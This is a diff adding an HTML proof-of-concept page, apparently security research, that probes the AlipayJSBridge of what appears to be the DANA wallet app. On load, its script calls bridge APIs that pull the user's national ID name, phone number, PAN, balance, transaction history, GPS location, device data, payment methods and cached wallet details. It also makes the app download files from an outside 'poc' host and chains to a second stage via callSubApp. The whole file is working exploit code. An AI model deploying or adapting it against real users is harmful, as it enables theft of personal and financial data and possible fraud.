@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>V7</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:10px;font-size:13px;margin:0;padding-top:26px}
+  h3{color:#ff0;margin:12px 0 3px;font-size:14px}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:6px;border:1px solid #333;margin:2px 0;font-size:11px}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:4px;font-size:12px;z-index:9}
+</style>
+</head>
+<body>
+<div id="status">v7 boot</div>
+<h3 id="hdr">V7 CLEAN-NET RUN</h3>
+<pre id="p-0">pending</pre>
+<pre id="p-1">pending</pre>
+<pre id="p-2">pending</pre>
+<pre id="p-3">pending</pre>
+<pre id="p-4">pending</pre>
+<pre id="p-5">pending</pre>
+<pre id="p-6">pending</pre>
+<pre id="p-7">pending</pre>
+<pre id="p-8">pending</pre>
+<pre id="p-9">pending</pre>
+<pre id="p-10">pending</pre>
+<pre id="p-11">pending</pre>
+<pre id="p-12">pending</pre>
+<pre id="p-13">pending</pre>
+<pre id="p-14">pending</pre>
+
+<script>
+(function(){
+  var st = new URLSearchParams(location.search).get('stage') || '1';
+  document.getElementById('hdr').textContent = 'V7 STAGE ' + st;
+  document.title = 'V7S' + st;
+  function set(id, obj){
+    var el = document.getElementById(id);
+    try { el.textContent = (typeof obj==='string')?obj:JSON.stringify(obj); } catch(e){ el.textContent = String(obj); }
+  }
+  function status(t){ document.getElementById('status').textContent = 'v7 s'+st+': '+t; }
+  function compact(o){ try { return typeof o==='string'?o:JSON.stringify(o); } catch(e){ return String(o); } }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    document.addEventListener('AlipayJSBridgeReady', function(){ cb(); }, false);
+    setTimeout(cb, 5000);
+  }
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done=false;
+      var t=setTimeout(function(){ if(!done){done=true;resolve({__timeout:true,waitedMs:timeoutMs||15000});} }, timeoutMs||15000);
+      try {
+        window.AlipayJSBridge.call(api, param||{}, function(r){
+          if(!done){done=true;clearTimeout(t);resolve(r);}
+        });
+      } catch(e){ if(!done){done=true;clearTimeout(t);resolve({__exception:String(e)});} }
+    });
+  }
+
+  bridgeReady(async function(){
+    if (!window.AlipayJSBridge){
+      set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)});
+      status('NO BRIDGE (browser?) - DONE');
+      return;
+    }
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, lpUrl:(sp.launcherParamUrl||'').slice(0,60), href:location.href.slice(0,60), dver:sp.danaAppVersion||sp.appVersion});
+    status('1/14 userinfo');
+
+    // Data bridges (reconfirm on 2.141.2 / device 2)
+    set('p-1', await call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'ktpName,globalPhoneNumber,userPan,userId,kycLevel,balance'}}, 20000));
+    status('2/14 trx');
+    set('p-2', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:true}, 25000));
+    status('3/14 gps');
+    var gps = await call('getLocationInfo', {}, 15000);
+    set('p-3', gps);
+    status('4/14 locationName');
+    var lat = (gps && gps.latitude) || '-7.4254221', lon = (gps && gps.longitude) || '111.3005175';
+    set('p-4', await call('locationName', {info:{lat:String(lat), long:String(lon)}}, 15000));
+    status('5/14 device');
+    set('p-11', await call('getAkuDeviceInfo', {}, 15000));
+    status('6/14 paymethod');
+    set('p-12', await call('queryPayMethod', {}, 15000));
+
+    // === CLEAN-NETWORK probes (the point of v7) ===
+    status('7/14 partner.invoke');
+    set('p-5', await call('requestApi', {operationType:'id.dana.minitunnel.partner.invoke', payload:{}}, 20000));
+    status('8/14 user.info.masking');
+    set('p-6', await call('requestApi', {operationType:'id.dana.minitunnel.user.info.masking', payload:{}}, 20000));
+    status('9/14 createShortLink');
+    set('p-7', await call('createShortLink', {url:'https://rfypych.github.io/poc/ping.txt'}, 20000));
+    status('10/14 download');
+    set('p-8', await call('download', {event:'generalDownload', info:{url:'https://rfypych.github.io/poc/ping.txt', fileName:'poc_v7_dl', fileFormat:'.txt'}}, 20000));
+    status('11/14 downloadFile');
+    set('p-9', await call('downloadFile', {url:'https://rfypych.github.io/poc/ping.txt', filePath:'v7probe.txt', downloadTaskId:2}, 20000));
+    status('12/14 nativeCache');
+    var s1 = await call('nativeCache', {info:{event:'save', key:'poc_v7', data:'marker7'}}, 12000);
+    var g1 = await call('nativeCache', {info:{event:'get', key:'poc_v7'}}, 12000);
+    var g2 = await call('nativeCache', {info:{event:'get', key:'walletDetail'}}, 12000);
+    set('p-10', {save:s1, getPoc:g1, getWallet:g2});
+    status('13/14 gate-contrast');
+    var sec = await call('getSecurityLevelInfo', {}, 12000);
+    var us = await call('getUserStatus', {}, 12000);
+    var cons = await call('getConsultOmni', {info:{}}, 12000);
+    set('p-13', {secLvl:sec, userStatus:us, consultOmni:cons});
+
+    if (st === '1'){
+      status('14/14 callSubApp stage2');
+      set('p-14', {action:'navigating container to stage2 via callSubApp...'});
+      var r = await call('callSubApp', {url:'https://rfypych.github.io/poc/v7.html?stage=2'}, 10000);
+      set('p-14', {callSubApp:r, note:'stage2 should now load in-session'});
+    } else {
+      set('p-14', {stage2:true, note:'network probes above ran in-session (callSubApp context)'});
+    }
+    status('DONE s'+st);
+  });
+})();
+</script>
+</body>
+</html>
